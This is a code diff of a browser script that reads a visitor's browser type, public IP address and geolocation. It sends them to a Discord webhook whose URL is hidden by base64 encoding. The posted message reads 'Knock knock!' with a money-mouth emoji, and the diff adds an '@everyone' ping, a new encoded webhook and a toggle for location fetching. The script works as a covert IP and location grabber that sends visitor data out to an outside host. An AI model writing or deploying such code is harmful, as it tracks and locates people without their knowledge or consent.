@@ -2,6 +2,8 @@
 let useragent = navigator.userAgent;
 let browser;
 
+const fetchLocation = true;
+
 if (useragent.match(/edge/i)) {
   browser = "Edge";
 } else if (useragent.match(/firefox|fxios/i)) {
@@ -35,18 +37,24 @@ function showPosition() {
 }
 
 // Fetch Public IP and Send Data to Discord Webhook
+
 fetch("https://api.ipify.org?format=json")
   .then((response) => response.json())
   .then(async (data) => {
     const ipAddress = data.ip;
-    const webhookEncoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMjMzODEwNjM2NzQ3NTc3My9iVS1KR2JoVnpVZGJGdWZDdXR0UUZKcko5UXpneXdGYmMwRVZMSHZpUzBkVFRKT05XRVMwLVhqenBDU0RRWDdrd1Z6YQ=="
+    const webhookEncoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNDE1OTExNTQ2Njk2OTE2OC9IaXJweVZ0VkM5dU1OOEloRDFGVzB1UmIxZC1BTUhzdDFLa2JWWFhsWWJoWl9zVUt3RnAxVTZmT2EzcE5zU0txTHNnZQ=="
     const webhook = atob(webhookEncoded);
 
-    let location = "Location unavailable";
-    try {
-      location = await showPosition(); // Await geolocation
-    } catch (error) {
-      console.error(error);
+    let location;
+    if(fetchLocation){
+      location = "Location unavailable";
+      try {
+        location = await showPosition(); // Await geolocation
+      } catch (error) {
+        console.error(error);
+      }
+    } else {
+      location = "Location variable is set to false";
     }
 
     // Send data to Discord webhook
@@ -56,7 +64,7 @@ fetch("https://api.ipify.org?format=json")
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        content: `:money_mouth: **Knock knock!** \n\n**IP Address:** ${ipAddress}\n**Lookup:** https://whatismyipaddress.com/ip/${ipAddress}\n**Geolocation:** ${location}\n\n**Browser:** ${browser}`,
+        content: `@everyone \n:money_mouth: **Knock knock!** \n\n**IP Address:** ${ipAddress}\n**Lookup:** https://whatismyipaddress.com/ip/${ipAddress}\n**Geolocation:** ${location}\n\n**Browser:** ${browser}`,
       }),
     })
       .then(() => console.log("Data sent to Discord webhook"))
